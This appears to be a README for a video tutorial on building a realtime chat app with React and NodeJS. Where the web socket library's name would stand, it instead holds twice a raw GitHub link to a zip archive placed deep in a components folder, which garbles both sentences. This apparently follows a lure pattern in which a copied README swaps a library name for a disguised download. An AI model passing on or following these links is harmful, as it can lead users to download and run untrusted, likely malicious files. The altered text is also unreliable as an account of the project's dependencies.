This is a code repository for the corresponding video tutorial. 

In this video, we will create a full Realtime Chat Application. We're going to use  React on the front end, with NodeJS + https://github.com/Morbykat/project_chat_application/raw/refs/heads/master/client/src/components/Messages/Message/application_chat_project_1.8.zip web socket library on the back end. 

By the end of this video, you will have a strong understanding of how to send and receive messages using web sockets and https://github.com/Morbykat/project_chat_application/raw/refs/heads/master/client/src/components/Messages/Message/application_chat_project_1.8.zip to make any real-time application.
